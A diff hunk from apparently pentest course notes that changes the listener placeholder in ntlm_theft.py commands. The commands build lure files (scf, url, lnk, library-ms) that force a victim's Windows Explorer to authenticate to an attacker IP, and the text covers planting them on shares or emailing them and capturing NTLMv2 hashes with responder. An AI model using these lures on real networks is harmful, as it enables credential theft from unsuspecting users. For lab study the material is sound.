@@ -19,10 +19,10 @@ cd ntlm_theft
 
 ```bash
 # Generate every supported lure type at once, pointed at your listener IP
-python3 ntlm_theft.py -g all -s <kali_ip> -f lure
+python3 ntlm_theft.py -g all -s $LocalIP -f lure
 
 # Generate just the library-ms lure specifically (same file type 12.3.1 builds by hand)
-python3 ntlm_theft.py -g scf,url,lnk,library-ms -s <kali_ip> -f lure
+python3 ntlm_theft.py -g scf,url,lnk,library-ms -s $LocalIP -f lure
 ```
 *Output lands in a `lure/` folder, one subfolder per file type. Drop any of them on a writable share (or deliver via email like the module's own `.Library-ms` workflow) and catch the NTLMv2 hash with `responder -I <interface>` once a victim's Explorer touches it, no double-click required for most of these formats, unlike the module's `.lnk`-triggers-a-reverse-shell chain, this whole family is specifically about forcing *authentication*, not code execution.*
 
